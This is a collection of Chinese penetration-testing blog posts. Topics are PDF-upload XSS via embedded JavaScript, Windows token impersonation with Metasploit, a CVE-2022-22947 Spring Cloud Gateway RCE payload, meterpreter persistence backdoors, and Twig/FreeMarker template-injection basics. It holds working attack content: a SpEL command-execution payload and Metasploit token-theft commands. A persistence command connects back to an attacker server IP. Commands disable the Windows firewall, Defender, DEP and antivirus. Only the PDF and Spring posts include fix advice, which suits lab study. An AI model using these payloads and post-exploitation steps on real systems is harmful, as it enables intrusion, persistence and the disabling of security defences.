<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">One document creates an alert box in another document. There are two documents, DocA and DocB, one open in a browser and the other in the viewer.</span><br><span class="line">// The following is a declaration at the document level in DocA</span><br><span class="line"></span><br><span class="line">var myAlertBoxes = new Object;</span><br><span class="line">myAlertBoxes.oMyCheckbox = &#123;</span><br><span class="line">cMsg: &quot;Care to see this message again?&quot;,</span><br><span class="line">bAfterValue: false</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//The following is a mouse-up action in DocA. The variable theOtherDoc is the Doc object of DocB. The alert box asks if the user wants to see this alert box again. If the user clicks the check box, the alert does not appear again.</span><br><span class="line"></span><br><span class="line">if ( !myAlertBoxes.oMyCheckbox.bAfterValue )</span><br><span class="line">&#123;</span><br><span class="line">app.alert(&#123;</span><br><span class="line">cMsg: &quot;This is a message from the DocA?&quot;,</span><br><span class="line">cTitle: &quot;A message from A. C. Robat&quot;,</span><br><span class="line">oDoc:theOtherDoc, </span><br><span class="line">oCheckbox: myAlertBoxes.oMyCheckbox</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="app-execDialog"><a href="#app-execDialog" class="headerlink" title="app.execDialog()"></a>app.execDialog()</h3><p>该函数功能创建一个对话框，可以自定义高度定制化对话框。</p>
<p>该函数四元组如下；</p>
<img src="/2021/11/10/pdf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-XSS/image-20211115114201673.png" class title="image-20211115114201673">



<h3 id="doc-getURL"><a href="#doc-getURL" class="headerlink" title="doc.getURL()"></a>doc.getURL()</h3><p>该函数为通过GET方法获取RL指向文件。</p>
<p>该函数四元组如下；</p>
<img src="/2021/11/10/pdf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-XSS/image-20211115114600384.png" class title="image-20211115114600384">

<p>该函数包含两个参数，分别为cURL（目标文件的地址）和bAppend（如果为true，将运行结果附加到当前文件；当文件在浏览器中运行时，推荐使用false）。</p>
<p>使用示例；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">this.getURL(&quot;http://www.example.com/&quot;, false);</span><br></pre></td></tr></table></figure>



<p>当该函数运行后，仍然会有安全性提示，如下：</p>
<img src="/2021/11/10/pdf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-XSS/image-20211115114650402.png" class title="image-20211115114650402">



<p>然而该函数还有另外一个功能是可以运行本地文件，同时为了防止执行任意文件，还在注册表项中\LOCAL_MACHINE\SOFTWARE\Policies\Adobe\Acrobat Reader\11.0\FeatureLoc kDown\ cDef aultLaunchAttachmentPerms进行了限制。当用户尝试执行文件不在限制范围内时，还会调用系统函数SaferiIsExecutableFileType判断是否为可执行文件，同时不受两方面限制后将会出现以下两个弹窗进行提示：</p>
<img src="/2021/11/10/pdf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-XSS/image-20211115115051252.png" class title="image-20211115115051252">



<p>最终打开目标文件；</p>
<img src="/2021/11/10/pdf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-XSS/image-20211115115132171.png" class title="image-20211115115132171">



<h2 id="PDF-XSS"><a href="#PDF-XSS" class="headerlink" title="PDF_XSS"></a>PDF_XSS</h2><hr>
<p>这里使用app.alert()函数在PDF中插入代码来测试xss，当然其他的攻击也可以利用上面的函数进行利用。这里使用的是迅捷PDF编辑器进行PDF的XSS测试。</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>首先在编辑器中新建文党，如下；</p>
<img src="/2021/11/10/pdf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-XSS/image-20211115115924780.png" class title="image-20211115115924780">



<p>右键文档缩略图，点击文档的属性设置，可以在右边看到页面设置。</p>
<img src="/2021/11/10/pdf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-XSS/image-20211115120103631.png" class title="image-20211115120103631">



<p>点击动作，可以选择打开和关闭页面的动作设置。进去点击新增按钮，运行JavaScript。</p>
<img src="/2021/11/10/pdf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-XSS/image-20211115120220718.png" class title="image-20211115120220718">



<p>边界js动作为alert弹窗</p>
<img src="/2021/11/10/pdf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-XSS/image-20211115120452458.png" class title="image-20211115120452458">



<p>可以看到在浏览器在线访问时，弹窗成功，js代码执行成功。</p>
<img src="/2021/11/10/pdf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-XSS/image-20211115120626777.png" class title="image-20211115120626777">

<p>经测试，在360浏览器，Google浏览器和Edge浏览器上访问PDF文件，js代码会被执行。</p>
<p><strong>注:</strong></p>
<p><strong>Adobe 支持自身的 JavaScript 对象模型，例如 alert(‘xss’)必须被 APP 对象调用，因此变成了 app.alert(‘xss’)。这意味着，利用 JavaScript 进行攻击时只能使用 Adobe 所支持的功能。</strong></p>
<h3 id="项目实战"><a href="#项目实战" class="headerlink" title="项目实战"></a>项目实战</h3><p>在项目功能点发现上传文件选项<img src="/2021/11/10/pdf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-XSS/image-20211115134208035.png" class title="image-20211115134208035"></p>
<p>构造插入恶意JS语句的PDF文件进行上传，</p>
<img src="/2021/11/10/pdf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-XSS/image-20211115135140939.png" class title="image-20211115135140939">



<p>在Google浏览器上访问上传的PDF文件，JS语句执行，弹窗成功</p>
<img src="/2021/11/10/pdf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-XSS/image-20211115135213863.png" class title="image-20211115135213863">



<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>1.作为网站管理员或开发者，可以选择强迫浏览器下载 PDF 文件，而不是提供在线浏览等，或修改 Web 服务器配置的 header 和相关属性</p>
<p>2.使用第三方插件解析pdf，不用chrome自带的pdf解析就行，<a href="https://github.com/adobe-type-tools/cmap-resources">https://github.com/adobe-type-tools/cmap-resources</a></p>
]]></content>
      <categories>
        <category>Web漏洞</category>
        <category>文件上传</category>
      </categories>
      <tags>
        <tag>-web漏洞 -XSS -PDF漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows令牌假冒</title>
    <url>/2021/11/01/windows%E4%BB%A4%E7%89%8C%E5%81%87%E5%86%92/</url>
    <content><![CDATA[<h1 id="windows令牌假冒"><a href="#windows令牌假冒" class="headerlink" title="windows令牌假冒"></a>windows令牌假冒</h1><hr>
<h2 id="访问令牌"><a href="#访问令牌" class="headerlink" title="访问令牌"></a>访问令牌</h2><hr>
<p><strong>访问令牌</strong>（Access Token）是Windows操作系统用于描述进程或线程安全上下文的一种对象。不同的用户登录计算机后， 都会生成一个Access Token，这个Token在用户创建进程或者线程时会被使用，不断的拷贝。</p>
<p>系统使用访问令牌来辨识拥有进程的用户，以及线程试图执行系统任务时是否具有所需的特权.与进程相关联，进程创建时根据LoginSession分配对应的TOKEN，含有与该进程用户账号、组信息、权限信息等。Token每次在用户登录时根据LoginSession分配，访问资源时提交Token进行身份验证。</p>
<p><strong>令牌分类</strong></p>
<ul>
<li>访问令牌(Access Token): 表示访问控制操作主体的系统对象</li>
<li>会话令牌(Session Token): 交互会话中唯一的身份标识符</li>
<li>密保令牌(Security Token): 又叫做认证令牌或硬件令牌，是一种计算机身份校验的物理设备，例如U盾</li>
</ul>
<p>windows系统下的令牌有两种表现形式:</p>
<p>1.Delegation token(授权令牌):用于交互会话登录(例如本地用户直接登录、远程桌面登录)<br>2.Impersonation token(模拟令牌):用于非交互登录(利用net use访问共享文件夹)</p>
<p>两种令牌都是在重启后才会消除，具有Delegation token的用户在注销后，该Token将变成Impersonation token，依旧有效。</p>
<h2 id="令牌窃取-x2F-假冒"><a href="#令牌窃取-x2F-假冒" class="headerlink" title="令牌窃取&#x2F;假冒"></a>令牌窃取&#x2F;假冒</h2><hr>
<p>这里使用msf的模块对系统中从令牌进行窃取，并对获取到的令牌进行利用</p>
<h3 id="incognito模块"><a href="#incognito模块" class="headerlink" title="incognito模块"></a>incognito模块</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">load incognito 加载模块</span><br></pre></td></tr></table></figure>

<img src="/2021/11/01/windows%E4%BB%A4%E7%89%8C%E5%81%87%E5%86%92/image-20211021210024276.png" class title="image-20211021210024276">

<p>相关参数命令:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">list_tokens               列举token，-u参数列举用户，-g参数列举用户组</span><br><span class="line">impersonate_token [token] 令牌假冒登录用户</span><br></pre></td></tr></table></figure>



<p>列举所有用户令牌</p>
<img src="/2021/11/01/windows%E4%BB%A4%E7%89%8C%E5%81%87%E5%86%92/image-20211021210254864.png" class title="image-20211021210254864">



<p>列举所有用户组令牌</p>
<img src="/2021/11/01/windows%E4%BB%A4%E7%89%8C%E5%81%87%E5%86%92/image-20211021210343650.png" class title="image-20211021210343650">



<p>此时的权限为SYSTEM权限</p>
<img src="/2021/11/01/windows%E4%BB%A4%E7%89%8C%E5%81%87%E5%86%92/image-20211021211343377.png" class title="image-20211021211343377">



<p>假冒NETWORK SERVICE的令牌，这里的\有两个，前面的符号是转义符号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impressonate_token ndsec-PC\\ndsec</span><br></pre></td></tr></table></figure>

<img src="/2021/11/01/windows%E4%BB%A4%E7%89%8C%E5%81%87%E5%86%92/image-20211021211257111.png" class title="image-20211021211257111">



<p>令牌已经被修改</p>
<img src="/2021/11/01/windows%E4%BB%A4%E7%89%8C%E5%81%87%E5%86%92/image-20211021211407856.png" class title="image-20211021211407856">



<h3 id="steal-token盗取进程令牌"><a href="#steal-token盗取进程令牌" class="headerlink" title="steal_token盗取进程令牌"></a>steal_token盗取进程令牌</h3><hr>
<p>使用steal_token命令盗用进程的令牌</p>
<p>列出当前状态下服务器的运行的进程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps</span><br></pre></td></tr></table></figure>

<img src="/2021/11/01/windows%E4%BB%A4%E7%89%8C%E5%81%87%E5%86%92/image-20211021212304540.png" class title="image-20211021212304540">



<p>可以看到我们此时的会话进程号是1288，令牌是SYSTEM</p>
<img src="/2021/11/01/windows%E4%BB%A4%E7%89%8C%E5%81%87%E5%86%92/image-20211021212412558.png" class title="image-20211021212412558">



<p>盗取dwm.exe进程的令牌ndsec-PC\ndsec</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">steal_token 2884</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>内网渗透</category>
        <category>横向渗透</category>
      </categories>
      <tags>
        <tag>-内网渗透 -Winows系统提权 -msf渗透</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2022/03/04/%E3%80%90CVE-2022-22947%E3%80%91Spring%20Cloud%20Gateway%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="【CVE-2022-22947】Spring-Cloud-Gateway远程代码执行漏洞复现"><a href="#【CVE-2022-22947】Spring-Cloud-Gateway远程代码执行漏洞复现" class="headerlink" title="【CVE-2022-22947】Spring Cloud Gateway远程代码执行漏洞复现"></a>【CVE-2022-22947】Spring Cloud Gateway远程代码执行漏洞复现</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Spring Cloud Gateway 是基于 Spring Framework 和 Spring Boot 构建的 API 网关，它旨在为微服务架构提供一种简单、有效、统一的 API 路由管理方式。<br>据公告描述，当启用和暴露 Gateway Actuator 端点时，使用 Spring Cloud Gateway 的应用程序可受到代码注入攻击。攻击者可以发送特制的恶意请求，从而远程执行任意代码。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3.1.0</span><br><span class="line">3.0.0至3.0.6</span><br><span class="line">3.0.0之前的版本</span><br></pre></td></tr></table></figure>



<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>靶场搭建可以使用vulhub进行漏洞复现，vulhub上针对该漏洞已经进行更新，还可以通过其他靶场环境进行漏洞复现。这里使用Vulfocus靶场环境进行复现。</p>
<h3 id="靶场环境"><a href="#靶场环境" class="headerlink" title="靶场环境"></a>靶场环境</h3><p><a href="http://vulfocus.io/#/dashboard?image_id=711335fd-33d8-4a68-b5aa-235d30ded5e2">http://vulfocus.io/#/dashboard?image_id=711335fd-33d8-4a68-b5aa-235d30ded5e2</a></p>
<p>如下图；</p>
<p>![image-20220304113236144](【CVE-2022-22947】Spring Cloud Gateway远程代码执行漏洞复现&#x2F;image-20220304113236144.png)</p>
<p>访问映射端口</p>
<p>![image-20220304135228182](【CVE-2022-22947】Spring Cloud Gateway远程代码执行漏洞复现&#x2F;image-20220304135228182.png)</p>
<h3 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h3><p>访问端口actuator，可以看到返回spring中存在可访问的端点，可发现存在gateway端点</p>
<p>![image-20220304135612461](【CVE-2022-22947】Spring Cloud Gateway远程代码执行漏洞复现&#x2F;image-20220304135612461.png)</p>
<p>下面对漏洞点&#x2F;actuator&#x2F;gateway&#x2F;routes&#x2F;EchoSec添加恶意的路由</p>
<p>payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;id&quot;: &quot;EchoSec&quot;,</span><br><span class="line">  &quot;filters&quot;: [&#123;</span><br><span class="line">    &quot;name&quot;: &quot;AddResponseHeader&quot;,</span><br><span class="line">    &quot;args&quot;: &#123;</span><br><span class="line">      &quot;name&quot;: &quot;Result&quot;,</span><br><span class="line">      &quot;value&quot;: &quot;#&#123;new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;\&quot;id\&quot;&#125;).getInputStream()))&#125;&quot;</span><br><span class="line">      //id为需要执行的命令，可设置其他命令执行</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;],</span><br><span class="line">  &quot;uri&quot;: &quot;http://example.com&quot;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>![image-20220304141850303](【CVE-2022-22947】Spring Cloud Gateway远程代码执行漏洞复现&#x2F;image-20220304141850303.png)</p>
<p>然后请求reflesh刷新配置</p>
<p>![image-20220304141945183](【CVE-2022-22947】Spring Cloud Gateway远程代码执行漏洞复现&#x2F;image-20220304141945183.png)</p>
<p>再次请求&#x2F;actuator&#x2F;gateway&#x2F;routes&#x2F;EchoSec，服务器返回服务器id值</p>
<p>![image-20220304142033285](【CVE-2022-22947】Spring Cloud Gateway远程代码执行漏洞复现&#x2F;image-20220304142033285.png)</p>
<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>官方已发布漏洞补丁及修复版本，请评估业务是否受影响后，酌情升级至安全版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Spring Cloud Gateway &gt;= 3.1.1</span><br><span class="line">Spring Cloud Gateway &gt;= 3.0.7</span><br></pre></td></tr></table></figure>



<p>临时缓解措施：</p>
<p>1.如果不需要Gateway actuator endpoint，可通过 management.endpoint.gateway.enabled: false 禁用它。</p>
<p>2.如果需要actuator，则应使用 Spring Security 对其进行防护</p>
<p>可参考：<a href="https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html#actuator.endpoints.security%E3%80%82">https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html#actuator.endpoints.security。</a></p>
]]></content>
  </entry>
  <entry>
    <title>后门永久植入</title>
    <url>/2021/11/01/%E5%90%8E%E9%97%A8%E6%B0%B8%E4%B9%85%E6%A4%8D%E5%85%A5/</url>
    <content><![CDATA[<h1 id="后门永久植入"><a href="#后门永久植入" class="headerlink" title="后门永久植入"></a>后门永久植入</h1><hr>
<h2 id="meterpreter后门"><a href="#meterpreter后门" class="headerlink" title="meterpreter后门"></a>meterpreter后门</h2><h3 id="Metsvc"><a href="#Metsvc" class="headerlink" title="Metsvc"></a>Metsvc</h3><hr>
<p>该模块生成一个端口为31337服务，并且上传到Temp临时文件夹下保存，当系统启动时直接开启服务。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run metsvc -A</span><br></pre></td></tr></table></figure>

<img src="/2021/11/01/%E5%90%8E%E9%97%A8%E6%B0%B8%E4%B9%85%E6%A4%8D%E5%85%A5/image-20211028164717074.png" class title="image-20211028164717074">



<h3 id="Persistence"><a href="#Persistence" class="headerlink" title="Persistence"></a>Persistence</h3><hr>
<p>该后门 模块 是通过设置定期时间连接服务器端口，系统启动时回连，自动运行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run persistence -A -S -U -i 60 -p 服务器端口 -r 服务器ip地址</span><br></pre></td></tr></table></figure>

<img src="/2021/11/01/%E5%90%8E%E9%97%A8%E6%B0%B8%E4%B9%85%E6%A4%8D%E5%85%A5/image-20211028165356667.png" class title="image-20211028165356667">



<p>可以看到生成个自动运行的木马到临时文件夹中，随着系统开启而运行</p>
]]></content>
      <categories>
        <category>内网渗透</category>
        <category>后门植入</category>
      </categories>
      <tags>
        <tag>-内网渗透 -后门植入 -msf后渗透</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2022/02/21/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BFreemaker/</url>
    <content><![CDATA[<h1 id="模板注入之Freemaker"><a href="#模板注入之Freemaker" class="headerlink" title="模板注入之Freemaker"></a>模板注入之Freemaker</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>FreeMarker 是一款 模板引擎：即一种基于模板和要改变的数据， 并用来生成输出文本(HTML网页，电子邮件，配置文件，源代码等)的通用工具。 它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。</p>
<p>模板编写为FreeMarker Template Language (FTL)。它是简单的，专用的语言， <em>不是</em> 像PHP那样成熟的编程语言。 那就意味着要准备数据在真实编程语言中来显示，比如数据库查询和业务运算， 之后模板显示已经准备好的数据。在模板中，你可以专注于如何展现数据， 而在模板之外可以专注于要展示什么数据。</p>
<img src="/2022/02/21/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BFreemaker/image-20220221142325248.png" class title="image-20220221142325248">

<p>这种方式被称为 MVC (模型 视图 控制器) 模式，对于动态网页来说，是一种特别流行的模式。 它帮助从开发人员(Java 程序员)中分离出网页设计师(HTML设计师)。设计师无需面对模板中的复杂逻辑， 在没有程序员来修改或重新编译代码时，也可以修改页面的样式。</p>
<p>而FreeMarker最初的设计，是被用来在MVC模式的Web开发框架中生成HTML页面的，它没有被绑定到 Servlet或HTML或任意Web相关的东西上。它也可以用于非Web应用环境中。</p>
<p>FreeMarker 是 免费的， 基于Apache许可证2.0版本发布。</p>
<h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>FusionAuth存在Freemaker模板注入，涉及版本FusionAuth &lt;&#x3D; 1.11.0。</p>
<p>FusionAuth是一个免费的身份管理平台，安装简单，易于集成。FusionAuth提供登录、注册、MFA、SSO、电子邮件模板、本地化、密码控制、强哈希、网络挂钩、基于角色的访问控制等功能。</p>
<p><strong>下载命令</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://storage.googleapis.com/inversoft_products_j098230498/products/fusionauth /1.10.0/fusionauth-app-1.10.0.zip</span><br></pre></td></tr></table></figure>

<img src="/2022/02/21/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BFreemaker/image-20220221143010639.png" class title="image-20220221143010639">



<p>下载elasticsearch插件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://storage.googleapis.com/inversoft_products_j098230498/products/fusionauth /1.10.0/fusionauth-search-1.10.0.zip</span><br></pre></td></tr></table></figure>

<img src="/2022/02/21/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BFreemaker/image-20220221161405215.png" class title="image-20220221161405215">



<p>进入bin目录，执行startup.sh脚本开始安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./startup.sh</span><br></pre></td></tr></table></figure>

<img src="/2022/02/21/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BFreemaker/image-20220221161600923.png" class title="image-20220221161600923">



<p>进入bin目录，执行startup.sh脚本开始安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./startup.sh</span><br></pre></td></tr></table></figure>

<img src="/2022/02/21/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BFreemaker/image-20220221151633154.png" class title="image-20220221151633154">



<p>然后浏览器访问9011端口，配置数据库和ElasticSearch连接</p>
<img src="/2022/02/21/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BFreemaker/image-20220221151741345.png" class title="image-20220221151741345">









<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/xuandao_ahfengren/article/details/107742893">(60条消息) FusionAuthRCE(CVE-2020-7799)复现_锋刃科技的博客-CSDN博客_fusionauth</a></p>
<p>[(60条消息) <a href="https://blog.csdn.net/caiqiiqi/article/details/104186575">CVE-2020-7799] Apache FreeMarker模板FusionAuth远程代码执行_公众号shadow sock7-CSDN博客</a></p>
<p><a href="https://gitee.com/itdragon/springmvc">springmvc: 学习SpringMVC代码 (gitee.com)</a></p>
]]></content>
  </entry>
  <entry>
    <title>杀软 及防火墙关闭</title>
    <url>/2021/11/01/%E6%9D%80%E8%BD%AF%E5%8F%8A%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%B3%E9%97%AD/</url>
    <content><![CDATA[<h1 id="杀软及防火墙关闭"><a href="#杀软及防火墙关闭" class="headerlink" title="杀软及防火墙关闭"></a>杀软及防火墙关闭</h1><hr>
<p>该文章记录使用msf工具进行后渗透模块，将目标主机的防火墙和杀毒软件进行关闭，方便后续上传后门和开启敏感端口</p>
<h2 id="windows自带防火墙服务"><a href="#windows自带防火墙服务" class="headerlink" title="windows自带防火墙服务"></a>windows自带防火墙服务</h2><h3 id="windows防火墙"><a href="#windows防火墙" class="headerlink" title="windows防火墙"></a>windows防火墙</h3><hr>
<p>关闭windows系统防火墙需进入目标主机shell和拥有管理员及以上权限才能执行，若权限不足需进行提权操作</p>
<p>首先使用msf反弹shell成功后，在meterpreter通道中进去目标主机shell，此时的权限为系统管理员权限</p>
<p><img src="/%E6%9D%80%E8%BD%AF%E5%8F%8A%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%B3%E9%97%AD/image-20211021110239586.png" alt="image-20211021110239586"><img src="/%E6%9D%80%E8%BD%AF%E5%8F%8A%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%B3%E9%97%AD/image-20211021110239705.png" alt="image-20211021110239705"></p>
<img src="/2021/11/01/%E6%9D%80%E8%BD%AF%E5%8F%8A%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%B3%E9%97%AD/image-20211021110136651.png" class title="image-20211021110136651">



<p>使用netsh命令关闭windows防火墙</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>

<img src="/2021/11/01/%E6%9D%80%E8%BD%AF%E5%8F%8A%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%B3%E9%97%AD/image-20211021110353082.png" class title="image-20211021110353082">



<p>目标主机之前的windows防火墙是开启的</p>
<img src="/2021/11/01/%E6%9D%80%E8%BD%AF%E5%8F%8A%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%B3%E9%97%AD/image-20211021110536165.png" class title="image-20211021110536165">



<p>执行命令后被关闭</p>
<img src="/2021/11/01/%E6%9D%80%E8%BD%AF%E5%8F%8A%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%B3%E9%97%AD/image-20211021110718801.png" class title="image-20211021110718801">



<h3 id="Denfender服务"><a href="#Denfender服务" class="headerlink" title="Denfender服务"></a>Denfender服务</h3><hr>
<p>Denfender是系统防火墙服务，可通过管理控制台命令停止该服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net stop windefend(服务名称)</span><br></pre></td></tr></table></figure>

<p>关闭windows Defender服务</p>
<img src="/2021/11/01/%E6%9D%80%E8%BD%AF%E5%8F%8A%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%B3%E9%97%AD/image-20211021111629546.png" class title="image-20211021111629546">



<p>服务开启自启动</p>
<img src="/2021/11/01/%E6%9D%80%E8%BD%AF%E5%8F%8A%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%B3%E9%97%AD/image-20211021111451170.png" class title="image-20211021111451170">



<p>服务停止</p>
<img src="/2021/11/01/%E6%9D%80%E8%BD%AF%E5%8F%8A%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%B3%E9%97%AD/image-20211021111952028.png" class title="image-20211021111952028">



<h3 id="DEP-数据执行保护"><a href="#DEP-数据执行保护" class="headerlink" title="DEP(数据执行保护)"></a>DEP(数据执行保护)</h3><hr>
<p>DEP 可以防止应用运行用于暂存指令的那部分内存中的数据，从而保护电脑。 如果 DEP 发现某个运行此类数据的应用，它将关闭该应用并通知你</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bcdedit.exe /set &#123;current&#125; nx AlwaysOf</span><br></pre></td></tr></table></figure>

<img src="/2021/11/01/%E6%9D%80%E8%BD%AF%E5%8F%8A%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%B3%E9%97%AD/image-20211021112310183.png" class title="image-20211021112310183">



<h2 id="杀毒软件"><a href="#杀毒软件" class="headerlink" title="杀毒软件"></a>杀毒软件</h2><hr>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run  killav</span><br><span class="line"></span><br><span class="line">run post/windows/manage/killava</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>内网渗透</category>
        <category>免杀处理</category>
      </categories>
      <tags>
        <tag>-内网渗透 -杀毒杀软</tag>
      </tags>
  </entry>
  <entry>
    <title>模板注入之TWIG</title>
    <url>/2022/02/16/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BTWIG/</url>
    <content><![CDATA[<h1 id="模板注入之TWIG"><a href="#模板注入之TWIG" class="headerlink" title="模板注入之TWIG"></a>模板注入之TWIG</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Twig可能是PHP最流行的模板库，它是由Synfony（一个非常流行的PHP框架）的创建者开发的。在我们的练习中，我们还将用到Craft CMS，它是一个内部使用Twig的内容管理系统。</p>
<h2 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2><p>注:安装环境PHP版本至少7.0</p>
<p>直接使用composer命令安装指定版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">composer require &quot;twig/twig:^2.0&quot;</span><br></pre></td></tr></table></figure>



<h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><ul>
<li><strong></strong>:说些什么.值的是输出一个变量值或者一个表达式的结果到模板。如：。</li>
</ul>
<p>变量绑定:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hello  &#123;&#123; var &#125;&#125;</span><br><span class="line"></span><br><span class="line">Hello &#123;&#123; var|escape &#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">twig也包含filters，它可以在模板渲染之前改变输出内容。如:&#123;&#123;表达式 | filters&#125;&#125;。</span><br><span class="line">注:这里还需要注意的是，当表达式中传值的时候，使用『:』,例如：&#123;&#123; path(‘board_reply’,&#123;id:item.id&#125;) &#125;&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li><p><strong><a href title target></a></strong>:做些什么.控制模板逻辑的tag(标签),用于执行声明，如if、for循环语句等。</p>
</li>
<li><p><strong></strong>:进行注释.它相当于php的语法。它用于注释单行和多行。注释的内容不作为页面输出。</p>
</li>
</ul>
<h3 id="block"><a href="#block" class="headerlink" title="block"></a>block</h3><p>相当于占位符，当被另一个模板继承时，可以调用这个模块。定义时的内容在继承的模板中默认是不会出现的，可以使用 {undefined{ parent() }} 来显示。块名称可以使用字母数字字符和下划线，不允许使用破折号(-)</p>
<h3 id="extends"><a href="#extends" class="headerlink" title="extends"></a>extends</h3><p>不支持多重继承，只支持一个扩展模板</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% extends &#x27;base.html.twig&#x27; %&#125;</span><br><span class="line">&#123;% include %&#125;：包含模板</span><br><span class="line">&#123;% extends %&#125;：扩展模板</span><br><span class="line">&#123;% embed %&#125; xxx &#123;% endembed %&#125;：包含模板并扩展该模板的内容，相当于 include 和 extends 的结合体</span><br><span class="line">&#123;% macro %&#125; xxx &#123;% endmacro %&#125;：定义宏以便多次调用，与定义 PHP 函数无异</span><br><span class="line">&#123;% from aaa import bbb as ccc %&#125;：从指定模板导入宏并设置别名</span><br></pre></td></tr></table></figure>



